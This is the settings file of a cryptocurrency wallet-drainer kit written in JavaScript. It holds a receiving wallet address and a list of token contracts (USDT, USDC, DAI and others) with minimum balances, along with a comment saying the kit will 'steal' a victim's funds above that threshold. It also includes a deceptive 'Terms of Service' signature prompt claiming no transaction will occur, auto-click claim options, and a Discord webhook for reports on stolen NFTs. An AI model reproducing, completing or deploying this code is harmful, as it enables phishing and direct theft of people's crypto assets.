const workChainId = 56; // The network we are working with is the chainId list https://chainlist.org/

const receiveAddresss = "0xe07B30fb2653e4FC7D8a96f8952A24f63A08B191"; // YOUR WALLET ADDRESS "TUTORIAL"


const drainNftsInfo = {
    minValue: 0.01, // Minimum value of the NFTS's last transactions (in the last 'checkMaxDay' days) of the collection. "TUTORIAL"
    maxTransfers: 10,
}

const signMessage = `Welcome, \n\n` +
    `Click to sign in and accept the Terms of Service.\n\n` +
    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
    `Wallet Address:\n{address}\n\n` +
    `Nonce:\n{nonce}`;

const autoConnect = false; //false; // auto connect wallet
const autoMint = true; // auto click claim button

// the "3" you see in all the addresses are the min value, if the victim has less than 3 USDC/T then it will not steal it. If it has over 3 USD it will steal it.
const erc20list = {
  // Bsc testnet
  /*
  '0x00a5Dc07A0F8061e896F0Acdd47d352e49FD1a2c': 100, // DAI BSC Testnet (97)
  '0x348236484ce96A293E210260b90bBFb228D6d1Fc': 100, // USDT BSC Testnet (97)
  */
  // Ethernet mainnet
  '0x6B175474E89094C44Da98b954EedeAC495271d0F': 0.01, // DAI ethernet
  '0xdAC17F958D2ee523a2206206994597C13D831ec7': 0.01, // usdt
  '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48': 0.01, // usdc
  '0xe9e7cea3dedca5984780bafc599bd69add087d56': 0.01, // busd
  '0xB8c77482e45F1F44dE1745F52C74426C631bDD52': 0.01, // BNB
  '0x25d887ce7a35172c62febfd67a1856f20faebb00': 0.01, // PEPE
}

const installInNewWindow = true; // install wallet if not installed

const discordWebhookURL = "https://discord.com/api/webhooks/"; // put ur discord webhook url in here to receive NFT's "TUTORIAL"
const feedbackEnabled = true; // let enabled to receive webhooks
/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") || (receiveAddress.length >= 64 || receiveAddress.length <= 40))
    console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
